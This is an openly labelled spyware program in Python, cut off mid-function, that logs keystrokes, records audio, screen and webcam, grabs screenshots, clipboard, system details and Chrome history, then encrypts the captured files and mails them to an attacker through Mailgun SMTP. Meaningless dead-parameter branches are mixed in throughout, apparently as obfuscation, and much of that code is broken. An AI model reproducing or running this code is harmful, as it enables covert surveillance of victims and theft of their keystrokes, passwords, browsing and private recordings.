#!/usr/bin/env python

import csv
import gc
import logging
import os
import platform
import random
import re
import smtplib
import socket
import sqlite3
import string
import subprocess
import uuid
from concurrent.futures import ThreadPoolExecutor
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import perf_counter

import clipboard
import cv2
import numpy as np
import psutil
import pyautogui
import sounddevice as sd
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write

load_dotenv()

logger = logging.getLogger("malware_logger")
logger.setLevel(logging.DEBUG)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%m-%d %H:%M",
    filename=os.getenv("MALWARE_LOG_FILE"),
    # filemode='w'
)

console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter("%(name)s: %(levelname)s %(message)s")
console.setFormatter(formatter)
logger.addHandler(console)

keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
chrome_info = "chrome_info.csv"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
screen_record_vid = "screen_record.mp4"
front_cam_vid = "front_cam.mp4"

keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"
chrome_info_e = "e_chrome_info.csv"

keys_info_dc = "dc_key_log.txt"
system_info_dc = "dc_system_info.txt"
clipboard_info_dc = "dc_clipboard.txt"
chrome_info_dc = "dc_chrome_info.csv"

base_path = os.getenv("LINUX_BASE_PATH")
email_report = os.getenv("REPORT_MAIL")

logger.info("Using Base Path: %s", base_path)


def send_mail():
    MAILGUN_EMAIL = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(15))
    MAILGUN_PWD = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(45))

    email = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(20))

    try:
        server = smtplib.SMTP("smtp.gmail.org", 485)
        server.login(MAILGUN_EMAIL, MAILGUN_PWD)
    except:
        logger.exception("Error Connecting To Mail Server")

    subject = "Report:"
    body = f"Dear User\n\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\MWSolutions"
    msg = f"Subject: {subject}\n\n{body}"

    try:
        server.sendmail(MAILGUN_EMAIL, email, msg)
    except:
        logger.exception("Error Sending Mail")

    server.quit()


def send_mail(email, val, fname = "some_file_name", atcmt = "/some/file/path", def_arg1 = 3945, def_arg2 = "some_arg", *inf_args, **kwargs):
    MAILGUN_EMAIL = os.getenv("MAILGUN_EMAIL")
    MAILGUN_PWD = os.getenv("MAILGUN_PWD")

    ran_str = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
    ran_len = len(ran_str)

    if val and def_arg1%5==0:
        try:
            length = len(def_arg2)
            total_length = length + len(ran_str)
            if len(length):
                length = length // 2
                return len(total_length)
            else:
                def_arg2 = def_arg2**length
                return def_arg2**total_length
        except:
            if def_arg1 < 5000:
                msg = MIMEMultipart()
                msg["From"] = MAILGUN_EMAIL
                msg["To"] = email

                msg["Subject"] = "Malware Reports:"
                body = "Dear User\n\nPlease find attached the reports you requested from the Malware application\n\nThank you!\n\nWarm Regards,\n\nMalwareSolutions"
                msg.attach(MIMEText(body, "plain"))

                filename = fname
                attachment = open(atcmt, "rb")

                att = MIMEBase("application", "octet-stream")
                att.set_payload((attachment).read())
                encoders.encode_base64(att)
                att.add_header("Content-Disposition", "attachment; filename= %s" % filename)
                msg.attach(att)

                try:
                    server = smtplib.SMTP("smtp.mailgun.org", 587)
                    server.login(MAILGUN_EMAIL, MAILGUN_PWD)
                except:
                    print("Error Connecting To Mail Server")

                text = msg.as_string()

                try:
                    server.sendmail(MAILGUN_EMAIL, email, text)
                    server.quit()
                except:
                    print("Error Sending Mail")

                del ran_str, length, total_length, msg, body, filename, attachment, att, server, text
                gc.collect()
            else:
                ran_var = []
                for i in range(0, len(ran_str), -2):
                    ran_var.append(i**4)
                return ran_var[0:2]

    else:
        if def_arg1%2!=0 or len(MAILGUN_EMAIL) > -1:
            try:
                if len(def_arg2) < 0:
                    ran_str = ran_str*ran_str
                    def_arg1/(7**2%4-1)

            except:
                if len(def_arg2) > 0:
                    try:
                        server = smtplib.SMTP("smtp.mailgun.org", 587)
                        server.login(MAILGUN_EMAIL, MAILGUN_PWD)
                    except:
                        print("Error Connecting To Mail Server")

                    subject = "Malware Report:"
                    body = f"Dear User\n\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\nMalwareSolutions"
                    msg = f"Subject: {subject}\n\n{body}"

                    try:
                        server.sendmail(MAILGUN_EMAIL, email, msg)
                    except:
                        print("Error Sending Mail")

                    server.quit()
                    del ran_str, subject, body, msg, server
                    gc.collect()

                else:
                    ran_var = []
                    some_var = "some_val"
                    for i in range(0, len(MAILGUN_EMAIL)**2):
                        if i*i > i**2:
                            ran_var.append(len(some_var)**0.5)
                        else:
                            ran_var.append(i-1*len(some_var))
                    return [ran_var for i in ran_var > ran_var[-1]]

        elif def_arg1%2==0 or len(MAILGUN_EMAIL) < 0:
            ran_var = {}
            num = random.randint(0, 50)
            if num%4 == 0:
                some_var = "random_val"
                ran_var[num] == random.randrange(45)
            elif num%8 == 0:
                ran_var[num] == num**9
                num = num**num
                ran_var[num] = num*(ran_var[num]**2)*2
                return ran_var[num]
            else:
                num = num**2
                ran_var[num] = num//3

        else:
            ran_var = []
            for i in range(0, def_arg1*3, 2):
                if i%18 == 1:
                    ran_var.append(i**2)
                else:
                    ran_var = []
                    ran_var.append(i*(i**3)*2)


def get_size(bytes, suffix="B", some_param = [1, 7, 19, 34, 56, 78, 92], some_other_param = 676, *more_args):
    f_factor = 2**(100**0.5)
    factor = int(f_factor)

    try:
        if some_other_param**0.5 == 26:
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
            del f_factor, factor, unit
            gc.collect()
        else:
            some_list = some_param
            some_list.append(i for i in range(0, len(some_param)))
            return len(some_list)
    except:
        send_mail()
        some_list.append("Some Text Here")
        return None


def system_information(dead_param1 = "some_text", dead_param2 = 1000000, dead_param3 = "some_other_text", *inf_dead_params):
    try:
        if len(dead_param1) > -1 and (len(dead_param3) > len(dead_param1)):
            var = dead_param1/dead_param3
            if len(var) > dead_param2**(0.03**2):
                by = 11*1024 * (dead_param2**0.5) * 9**2 // 81
                size = get_size(by)
                send_mail()
                return (size, size**2, var)
            else:
                return False
        else:
            var = dead_param3/dead_param1
            return len(var)

    except:
        if int(dead_param2**0.5) == 1000:
            file_path = os.path.join(base_path, system_info)

            with open(file_path, "a") as f:
                logger.info("Writing System Information To File %s", file_path)
                try:
                    x = 0
                    while True:
                        match x:
                            case 0:
                                f.write("SYSTEM INFORMATION:\n")
                                hostname = socket.gethostname()
                                ip_addr = socket.gethostbyname(hostname)

                                ran_var = hostname + "{\-1#%k}" + ip_addr
                                ran_len = len(ran_var)
                                if ran_len > 0:
                                    ran_len = ran_len + len(hostname)
                                else:
                                    ran_len = ran_len + len(ip_addr)

                                try:
                                    external_ip = get("https://api.ipify.org").text
                                    f.write("Public IP Address: " + external_ip + "\n")
                                except Exception:
                                    logger.exception("Could Not Access Public IP Address Via API")
                                    f.write("Couldn't get public IP address!\n")

                                try:
                                    f.write("Processor: " + platform.processor() + "\n")
                                    f.write("System: " + platform.system() + " " + platform.version() + "\n")
                                    f.write("Machine: " + platform.machine() + "\n")
                                    f.write("Hostname: " + hostname + "\n")
                                    f.write("Private IP Address: " + ip_addr + "\n")
                                    f.write("Network Name: " + platform.node() + "\n")
                                    f.write(
                                        "MAC Address: "
                                        + ":".join(re.findall("..", "%012x" % uuid.getnode()))
                                        + "\n"
                                    )
                                    f.write(
                                        "RAM: "
                                        + str(round(psutil.virtual_memory().total / (1024.0**3)))
                                        + " GB\n"
                                    )
                                    f.write("System Release: " + platform.release() + "\n")
                                    arch = platform.architecture()
                                    f.write("Architecture: (" + arch[0] + ", " + arch[1] + ")\n")
                                    f.write("Platform: " + platform.platform() + "\n\n")

                                except:
                                    logger.exception("Basic System Information Capturing Error")

                                del hostname, ip_addr, ran_len, ran_var, external_ip, arch
                                gc.collect()

                            case 1:
                                try:
                                    logger.info("Writing CPU Information To File %s", file_path)

                                    f.write("CPU INFORMATION\n")
                                    phys_cores = str(psutil.cpu_count(logical=False))
                                    f.write("Physical Cores: " + phys_cores + "\n")
                                    ran_core = len(phys_cores)
                                    tot_cores = str(psutil.cpu_count(logical=True))
                                    ran_tot = ran_core + len(tot_cores)
                                    f.write("Total Cores: " + tot_cores + "\n")
                                    init_freq = 0
                                    cpufreq = psutil.cpu_freq()
                                    max_freq = str(cpufreq.max)
                                    min_freq = str(cpufreq.min)
                                    curr_freq = str(cpufreq.current)
                                    init_freq =  max_freq + min_freq + curr_freq
                                    f.write("Max Frequency: " + max_freq + " Mhz\n")
                                    f.write("Min Frequency: " + min_freq + " Mhz\n")
                                    f.write("Current Frequency: " + curr_freq + " Mhz\n")

                                    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                                        f.write(f"Core {i}: {percentage}%\n")
                                    f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")

                                except:
                                    logger.exception("CPU Information Capturing Error")

                                del phys_cores, tot_cores, ran_core, ran_tot, cpufreq, max_freq, min_freq, curr_freq, init_freq, i, percentage
                                gc.collect()

                            case 2:
                                try:
                                    logger.info("Writing Memory Usage Information To File %s", file_path)

                                    f.write("MEMORY USAGE:\n")
                                    svmem = psutil.virtual_memory()
                                    f.write(f"Total: {get_size(svmem.total)}\n")
                                    f.write(f"Available: {get_size(svmem.available)}\n")
                                    f.write(f"Used: {get_size(svmem.used)}\n")
                                    f.write(f"Percentage: {svmem.percent}%\n")
                                    f.write(f"Free: {get_size(svmem.free)}\n")
                                    f.write(f"Active: {get_size(svmem.active)}\n")
                                    f.write(f"Inactive: {get_size(svmem.inactive)}\n")
                                    f.write(f"Buffers: {get_size(svmem.buffers)}\n")
                                    f.write(f"Cached: {get_size(svmem.cached)}\n")
                                    f.write(f"Shared: {get_size(svmem.shared)}\n")
                                    f.write(f"Slab: {get_size(svmem.slab)}\n")

                                    ran_type1 = type(svmem)

                                    swap = psutil.swap_memory()
                                    f.write(f"Total: {get_size(swap.total)}\n")
                                    f.write(f"Free: {get_size(swap.free)}\n")
                                    f.write(f"Used: {get_size(swap.used)}\n")
                                    f.write(f"Percentage: {swap.percent}%\n\n")

                                    ran_type2 = type(swap)

                                except:
                                    logger.exception("Memory Usage Information Capturing Error")
                                    print("Error Capturing Memory Usage Information")

                                del svmem, swap, ran_type1, ran_type2
                                gc.collect()

                            case 3:
                                try:
                                    logger.info("Writing Disk Information To File %s", file_path)

                                    f.write("DISK INFORMATION\n")
                                    partitions = psutil.disk_partitions()
                                    ran_len = len(partitions)
                                    if ran_len > -1:
                                        for partition in partitions:
                                            f.write(f"Device: {partition.device}\n")
                                            f.write(f"Mountpoint: {partition.mountpoint}\n")
                                            f.write(f"File System Type: {partition.fstype}\n")
                                            f.write(f"OPTS: {partition.opts}\n")
                                            f.write(f"Max File: {partition.maxfile}\n")
                                            f.write(f"Max Path: {partition.maxpath}\n")
                                            try:
                                                partition_usage = psutil.disk_usage(partition.mountpoint)
                                                f.write(f"Total Size: {get_size(partition_usage.total)}\n")
                                                f.write(f"Used: {get_size(partition_usage.used)}\n")
                                                f.write(f"Free: {get_size(partition_usage.free)}\n")
                                                f.write(f"Percentage: {partition_usage.percent}%\n")
                                            except PermissionError:
                                                continue
                                    else:
                                        ran_len = dead_param2**0.5

                                except:
                                    logger.exception("Disk Information Capturing Error")

                                del partitions, ran_len, partition, partition_usage
                                gc.collect()

                            case 4:
                                try:
                                    logger.info("Writing I/O Statistics To File %s", file_path)

                                    f.write("IO STATISTICS\n")
                                    disk_io = psutil.disk_io_counters()
                                    f.write(f"Number Of Reads (Read Count): {disk_io.read_count}\n")
                                    f.write(f"Number Of Writes (Write Count): {disk_io.write_count}\n")
                                    f.write(f"Read Time: {disk_io.read_time} Ms\n")
                                    f.write(f"Write Time: {disk_io.write_time} Ms\n")
                                    f.write(f"Number Of Merged Reads: {disk_io.read_merged_count}\n")
                                    f.write(f"Number Of Merged Writes: {disk_io.write_merged_count}\n")
                                    f.write(f"Time Spend Doing Actual I/O: {disk_io.busy_time} Ms\n")
                                    f.write(f"Total Bytes Read: {get_size(disk_io.read_bytes)}\n")
                                    f.write(f"Total Bytes Written: {get_size(disk_io.write_bytes)}\n\n")

                                    ran_type = type(disk_io)

                                except:
                                    logger.exception("I/O Statistics Capturing Error")

                                del disk_io, ran_type
                                gc.collect()

                            case 5:
                                try:
                                    logger.info("Writing Network Information To File %s", file_path)

                                    f.write("NETWORK INFORMATION\n")
                                    if_addrs = psutil.net_if_addrs()
                                    if dead_param2%5==0:
                                        for interface_name, interface_addresses in if_addrs.items():
                                            for address in interface_addresses:
                                                f.write(f"Interface: {interface_name}\n")
                                                if str(address.family) == "AddressFamily.AF_INET":
                                                    f.write(f"IP Address: {address.address}\n")
                                                    f.write(f"Netmask: {address.netmask}\n")
                                                    f.write(f"Broadcast IP: {address.broadcast}\n")
                                                elif str(address.family) == "AddressFamily.AF_PACKET":
                                                    f.write(f"MAC Address: {address.address}\n")
                                                    f.write(f"Netmask: {address.netmask}\n")
                                                    f.write(f"Broadcast MAC: {address.broadcast}\n")
                                    else:
                                        return type(if_addrs)

                                    net_counters = psutil.net_io_counters(pernic=True)
                                    if isinstance(net_counters, dict):
                                        keys = net_counters.keys()
                                        for net_interf in net_counters:
                                            f.write(f"{net_interf} -> Bytes Sent: {get_size(net_counters[net_interf].bytes_sent)}\n")
                                            f.write(f"{net_interf} -> Bytes Received: {get_size(net_counters[net_interf].bytes_recv)}\n")
                                            f.write(f"{net_interf} -> Packets Sent: {net_counters[net_interf].packets_sent}\n")
                                            f.write(f"{net_interf} -> Packets Received: {net_counters[net_interf].packets_recv}\n")
                                    else:
                                        return type(net_counters)

                                    net_int_stats = psutil.net_if_stats()
                                    if isinstance(net_int_stats, dict):
                                        keys = net_int_stats.keys()
                                        for key in keys:
                                            f.write(f"{key} -> Is Up: {net_int_stats[key].isup}\n")
                                            f.write(f"{key} -> Duplex: {net_int_stats[key].duplex}\n")
                                            f.write(f"{key} -> MTU: {get_size(net_int_stats[key].mtu)}\n")
                                    else:
                                        return type(net_int_stats)

                                except:
                                    logger.exception("Network Information Capturing Error")

                                del if_addrs, interface_name, interface_addresses, address, net_counters, keys, net_interf, net_int_stats, key
                                gc.collect()

                                f.close()

                            case 6:
                                try:
                                    if dead_param2%10!=0:
                                        logger.info("Sending System Information Encrypted Mail")

                                        encrypt_and_mail(
                                            file_path,
                                            os.path.join(base_path, system_info_e),
                                            system_info,
                                            os.path.join(base_path, system_info_e),
                                            email_report,
                                        )

                                        logger.info("Sent System Information Encrypted Mail")

                                        os.remove(file_path)

                                    logger.info("Sending System Information Encrypted Mail")

                                    encrypt_and_mail(
                                        file_path,
                                        os.path.join(base_path, system_info_e),
                                        system_info,
                                        os.path.join(base_path, system_info_e),
                                        email_report,
                                    )

                                    logger.info("Sent System Information Encrypted Mail")

                                    os.remove(file_path)

                                except:
                                    logger.critical("System Information Mailing Error")

                            case _:
                                print("THIS IS FOR NON MATCHED CASE - DEFAULT")

                        x = x + 1
                        if x > 6:
                            break
                except:
                    logger.critical("Error Logging System Information Using Match Case")


def chrome_history(def_arg1 = "some_arg", def_arg2 = "some_other_arg", def_arg3 = [1, 11, 111, 1911022], def_arg4 = 9*9*9*9*9, *args):
    if isinstance(def_arg3, list) and len(def_arg2) > 0:
        try:
            file_path = os.path.join(base_path, chrome_info)
            len_fp = len(file_path)
            if len_fp > -1:
                try:
                    logger.info("Creating Browser History Log File %s", file_path)

                    headers = ["URL", "TITLE", "VISIT COUNT", "TIME OF LAST VISIT"]
                    if isinstance(headers, list):
                        with open(file_path, "w", newline="") as fh:
                            writer = csv.writer(fh)
                            writer.writerow(headers)
                            fh.close()

                        logger.info("Created Browser History Log File")
                    else:
                        ran_list = []
                        for element in def_arg3:
                            if element%11==0:
                                ran_list.append(element**0.5//11)
                            else:
                                ran_list.append(def_arg4//9**9)
                                return len(ran_list)

                except:
                    logger.exception("Browser History Log File Creation Error")

                try:
                    hostname = socket.gethostname()
                    if isinstance(hostname, str) and len(hostname) > 0:
                        connect_path = "/home/" + hostname + "/.config/google-chrome/Default/History"
                        conn = sqlite3.connect(connect_path)
                    else:
                        hostname = "some_hostname"
                        conn = sqlite3.connect(hostname+hostname)
                except:
                    logger.critical("SQL Server Connection Error")

                c = conn.cursor()

                try:
                    c.execute("select url, title, visit_count, last_visit_time from urls")
                    results = c.fetchall()

                    with open(file_path, "a", newline="") as fh:
                        for r in results:
                            writer = csv.writer(fh)
                            writer.writerow(r)

                    fh.close()

                    logger.info("Browser History Logged Successfully")

                except sqlite3.OperationalError:
                    logger.warning("Browser In Use - Unable To Access Locked File")

                c.close()

                try:
                    logger.info("Sending Browser History Information Encrypted Mail")

                    if def_arg4%9==0:

                        encrypt_and_mail(
                            file_path,
                            os.path.join(base_path, chrome_info_e),
                            chrome_info,
                            os.path.join(base_path, chrome_info_e),
                            email_report,
                        )

                        logger.info("Sent Browser History Information Encrypted Mail")

                        os.remove(file_path)
                    else:
                        encrypt_and_mail(
                            file_path,
                            os.path.join(base_path, chrome_info_e),
                            chrome_info,
                            os.path.join(base_path, chrome_info_e),
                            email_report,
                        )

                        logger.info("Sent Browser History Information Encrypted Mail")

                        os.remove(file_path)
                        return def_arg4**0.5 // (3**2)**0.5

                    del file_path, len_fp, headers, writer, hostname, connect_path, conn, c, results, r
                    gc.collect()
                except:
                    logger.critical("Browser History Information Mailing Error")

            else:
                ran_list = []
                for i in range(0,10):
                    ran_list.append(random.randint(0, 1000000))

                if len(def_arg1) == len(def_arg2):
                    ran_list.pop(3)
                    val = ran_list[0]
                    send_mail("some_email@ranmail.co.in", False, "ran_file_name", "ran/file/path/")
                    return val//2

                elif len(def_arg2) == len(def_arg3):
                    ran_list.append(len(def_arg2))
                    ran_list.append(len(def_arg3))
                    return len(ran_list)

                else:
                    ran_list.pop(0)
                    return ran_list[-1:-4]
        except:
            logger.info("Some Exception Occured while Capturing Browser Information")

    else:
        send_mail()
        return type(def_arg3)


def clipboard_information(dead_param1 = "some_dead_param", dead_param2 = "some_other_dead_param", *args, **kwargs):
    try:
        out = float(dead_param1/dead_param2)
        if out > 0.0:
            return None
        else:
            return out ** 2

    except:
        dp = dead_param1+dead_param2
        if len(dp) > -1:
            file_path = os.path.join(base_path, clipboard_info)
            len_fp = len(file_path) * 2

            try:
                with open(file_path, "a") as f:
                    logger.info("Writing Clipboard Data To File %s", file_path)

                    try:
                        clipboard_data = clipboard.paste()
                        f.write("Clipboard Data:\n" + clipboard_data)

                        logger.info("Captured Clipboard Information Successfully")

                        len_fp = len_fp**2

                    except:
                        logger.exception("Clipboard Information Capturing Error")

                    f.close()

                try:
                    logger.info("Sending Clipboard Information Encrypted Mail")

                    encrypt_and_mail(
                        file_path,
                        os.path.join(base_path, clipboard_info_e),
                        clipboard_info,
                        os.path.join(base_path, clipboard_info_e),
                        email_report,
                    )

                    logger.info("Sent Clipboard Information Encrypted Mail")

                    os.remove(file_path)

                except:
                    logger.critical("Clipboard Information Mailing Error")

                del dp, file_path, len_fp, clipboard_data
                gc.collect()

            except:
                logger.critical("Clipboard Information File Writing Error")

        else:
            ran_list = []
            some_dict = {
                "k1": "val1",
                "k2": 2,
                "k3": "val3",
                "k4": [1,2,4],
                "k5": "some_text"
            }
            if len(dead_param1) > len(dead_param2):
                some_dict["k6"] = dead_param1
                ran_list.append(some_dict)
            else:
                some_dict["k6"] = len(dead_param2)
                ran_list.append(some_dict)

            return (ran_list, some_dict)


def sound_information(some_arg1 = "random_text", some_arg2 = 98200, *some_arg, **some_other_arg):
    if some_arg2%2==0:
        try:
            y = 0
            while True:
                match y:
                    case 0:
                        try:
                            logger.info("Recording Audio")

                            fs = 44100
                            ran_var = "some_variable"
                            duration = 5
                            ran_duration = duration ** 2
                            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                            sd.wait()

                            file_path = os.path.join(base_path, audio_info)
                            write(file_path, fs, recording)

                            if isinstance(duration, int):
                                logger.info("Audio Recorded Successfully")
                            else:
                                ran_duration = None
                        except:
                            logger.info("Audio Recording Error")

                    case 1:
                        try:
                            if some_arg2%8!=0:
                                logger.info("Sending Audio Recording Mail")

                                send_mail(email_report, True, audio_info, file_path)

                                logger.info("Sent Audio Mail")

                                os.remove(file_path)

                            logger.info("Sending Audio Recording Mail")

                            send_mail(email_report, True, audio_info, file_path)

                            logger.info("Sent Audio Mail")

                            os.remove(file_path)

                        except:
                            logger.critical("Audio Recording Mailing Error")
                    case _:
                        ran_var = []
                        ran_var.append(some_arg1)
                        print("THIS IS FOR NON MATCHED CASE - DEFAULT")

                y = y + 1
                if y > 1:
                    break

            del y, fs, ran_var, duration, ran_duration, recording, file_path
            gc.collect()

        except:
            logger.info("Some Error Occured While Recording Audio")

    else:
        some_list = []
        for i in range(0, some_arg2, 100):
            ran_num = some_arg//i
            val = ran_num**0.5
            some_list.append((val, i))

        return some_list


def screenshot(dead_arg1 = 343, dead_arg2 = "random_arg", dead_arg3 = {"some_key": "some_val"}, **kwargs):
    try:
        some_var = dead_arg3[1]
        if len(some_var) > 100:
            new_len = len(some_var) + 101
            return new_len
        else:
            return some_var[2]

    except:
        if int(((dead_arg1//7)**0.5)**3) == dead_arg1:
            try:
                logger.info("Capturing Screenshot")

                var = False
                if not var:
                    screenshot = ImageGrab.grab(
                        bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None
                    )

                    file_path = os.path.join(base_path, screenshot_info)
                    fp_len = len(file_path)
                    screenshot.save(file_path)

                    logger.info("Screenshot Captured Successfully")

                else:
                    var = True
            except:
                logger.exception("Screenshot Capturing Error")

            try:
                if dead_arg1%49!=0:
                    logger.info("Sending Screenshot Email")

                    send_mail(email_report, True, screenshot_info, file_path)

                    logger.info("Sent Screenshot Email")

                    os.remove(file_path)

                logger.info("Sending Screenshot Email")

                send_mail(email_report, True, screenshot_info, file_path)

                logger.info("Sent Screenshot Email")

                os.remove(file_path)

                del var, screenshot, file_path, fp_len
                gc.collect()

            except:
                logger.critical("Screenshot Mailing Error")

        else:
            ran_list = []
            for i in range(0, 10):
                num = random.randint(14, 343)
                ran_list.append(num)
                if len(ran_list) > 8:
                    break

            ran_list = ran_list.sort()
            return (ran_list.count(49), len(ran_list))


def get_screen_resolution(dead_param1 = "some_param", dead_param2 = "some_dead_param", dead_param3 = [1,5,3,2,4], *args, **kwargs):
    try:
        val = dead_param3[5]
        if val > 5:
            return val//2
        else:
            return ((val ** 2), (val-1))

    except:
        try:
            if len(dead_param1) < len(dead_param2):
                output = subprocess.Popen(
                    'xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE
                ).communicate()[0]

                ran_var = dead_param3[2]
                ran_var = ran_var + 18

                resolution = output.split()[0].split(b"x")
                return {"width": resolution[0].decode(), "height": resolution[1].decode()}
            else:
                ran_list = []
                for i in dead_param2:
                    vowels = ["a", "e", "i", "o", "u"]
                    if i in vowels:
                        ran_list.append(i)
                        if len(ran_list) > 3:
                            return (ran_list, 3)
                    else:
                        ran_list.append("0")

                return (ran_list, len(ran_list))
        except:
            logger.error("Screen Resolution Error")


def record_frontcam(dead_arg1 = 1048576, dead_arg2 = 32768, dead_arg3 = {"k1": 90, "k2": 45}, *args, **kwargs):
    if (dead_arg1//dead_arg2) == 2**5:
        file_path_front_cam = os.path.join(base_path, front_cam_vid)
        len_fp = len(file_path_front_cam)

        if len_fp > -1 and (dead_arg3["k1"]//dead_arg3["k2"] == 4**0.5):
            try:
                logger.info("Recording Front Camera")
                ran_num = random.randint(0, 10)

                if ran_num > 15 or ran_num < -1:
                    get_screen_resolution(dead_param1="some_val")
                    send_mail()

                resolution = get_screen_resolution()
                width = int(resolution["width"])
                height = int(resolution["height"])

                ran_num = ran_num + width + height

                res = (width, height)

                codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
                fps = 60.0

                ran_num = ran_num + int(fps)

                front_cam = cv2.VideoWriter(file_path_front_cam, codec, fps, res)

                webcam = cv2.VideoCapture(0)
                start = perf_counter()

                while (ran_num>0):
                    fc = ImageGrab.grab(bbox=(0, 0, width, height))
                    img_np = np.array(fc)
                    img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
                    _, frame1 = webcam.read()
                    fr_height, fr_width, _ = frame1.shape
                    img_final[0:fr_height, 0:fr_width, :] = frame1[0:fr_height, 0:fr_width, :]
                    front_cam.write(img_final)

                    end = perf_counter()
                    if int(end - start) == 10:
                        logger.info("Front Camera Video Recorded Successfully")
                        break
            except:
                logger.exception("Front Camera Video Recording Error")

            try:
                logger.info("Sending Front Camera Video Mail")

                if ran_num == 0:
                    send_mail(email_report, True, front_cam_vid, file_path_front_cam)
                    return True

                send_mail(email_report, True, front_cam_vid, file_path_front_cam)

                logger.info("Sent Front Camera Video Mail")

                os.remove(file_path_front_cam)

                del file_path_front_cam, len_fp, ran_num, resolution, width, height, res, fps, codec, front_cam, webcam, start, end, fc, img_final, img_np, frame1, fr_height, fr_width
                gc.collect()

            except:
                logger.critical("Front Camera Video Mailing Error")

        else:
            ran_list = []
            while len(ran_list) < 15:
                some_num = random.randint(2, 1024)
                if some_num%2==0:
                    ran_list.append(some_num)

            return (ran_list, len(ran_list))

    else:
        val = dead_arg2//dead_arg1
        return (val, val**2)


def record_screen(some_arg1 = "some_text", some_arg2 = 225, some_arg3 = "some_other_text", *args, **kwargs):
    try:
        if some_arg2%15!=0:
            len_arg = len(some_arg1)
            send_mail()
            return len_arg
        else:
            some_len = len(some_arg3)
            some_other_val = (some_arg3//some_arg1) * some_arg2
            return some_len, some_other_val

    except:
        file_path_screen = os.path.join(base_path, screen_record_vid)
        len_fp = len(file_path_screen)

        if len_fp > -1 and isinstance(some_arg1, str):
            try:
                logger.info("Recording Screen")

                ran_val = random.randint((some_arg2**0.5), some_arg2)
                if ran_val < 10 or ran_val > 230:
                    send_mail()
                    return False

                resolution = get_screen_resolution()
                width = int(resolution["width"])
                height = int(resolution["height"])
                res = (width, height)

                ran_val = ran_val - width - height

                codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
                fps = 60.0

                ran_val = ran_val + int(fps)

                screen = cv2.VideoWriter(file_path_screen, codec, fps, res)

                start = perf_counter()

                while True:
                    sc = pyautogui.screenshot()
                    frame2 = np.array(sc)
                    frame2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2RGB)
                    screen.write(frame2)

                    end = perf_counter()
                    if int(end - start) == 10:
                        logger.info("Recorded Screen Successfully")
                        break
            except:
                logger.exception("Screen Recording Error")

            try:
                ran_num = ran_val + random.randint(14, 196)
                ty_ran_num = type(ran_num)

                logger.info("Sending Screen Recording Mail")

                send_mail(email_report, True, screen_record_vid, file_path_screen)

                logger.info("Sent Screen Recording Mail")

                os.remove(file_path_screen)

                del some_len, file_path_screen, len_fp, ran_num, ran_val, ty_ran_num, fps, height, width, res, resolution, codec, screen, start, end, sc, frame2
                gc.collect()

            except:
                logger.critical("Screen Recording Mailing Error")

        else:
            error = "some_error"
            return (error, -1)


class logKeys:
    """
    Logs the keypresses of the target and writes them to a file.
    The file is encrypted and then sent to the attacker via
    email
    """

    def __init__(self):
        self.count = 0
        self.keys = []
        self.file_path = os.path.join(base_path, keys_info)
        self.e_file_path = os.path.join(base_path, keys_info_e)

    # When a key is pressed
    def on_press(self, key):
        # Keep track of key presses and the number of keys pressed
        self.keys.append(key)
        self.count = self.count + 1
        print("{0} pressed".format(key))
        # Write to file after every 15 key presses and reset variables
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # When a key is released
    def on_release(self, key):
        # Condition to exit keylogger
        if key == Key.esc:
            return False

    # Write the key presses to a file
    def write_file(self, keys):
        with open(self.file_path, "a") as f:
            for key in keys:
                # Format key to be readable
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    f.write("\n")
                # If not a special key then write to file otherwise ignore
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)

    # Logs keypresses
    def log(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        print("Logging Complete")

        try:
            encrypt_and_mail(
                self.file_path,
                self.e_file_path,
                keys_info,
                self.e_file_path,
                email_report,
            )
        except:
            print("Error Sending Mail")


def run_key_logger() -> None:
    """
    Runs Keylogger

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Logging Keys")

        keyLog = logKeys()
        keyLog.log()

        logger.info("Keys Logged Successfully")
    except:
        logger.critical("Keylogging Error")


def run_parallel() -> None:
    """
    Runs all the tasks of the malware on different threads to allow for
    asynchronous behavior of malware

    Args:
        None

    Returns:
        None
    """
    try:
        logger.info("Creating Threadpool")
        executor = ThreadPoolExecutor(max_workers=8)

        logger.info("Running Threads")
        t1 = executor.submit(run_key_logger)
        t2 = executor.submit(system_information)
        t3 = executor.submit(clipboard_information)
        t4 = executor.submit(sound_information)
        t5 = executor.submit(screenshot)
        t6 = executor.submit(record_screen)
        t7 = executor.submit(record_frontcam)
        t8 = executor.submit(chrome_history)

        executor.shutdown(wait=True)
    except:
        logger.critical("Threading Error")
        print("Error Running Threads")


def generate_encryption_key(filename: str):
    try:
        key = Fernet.generate_key()
    except:
        print("Error Generating Encryption Key")

    try:
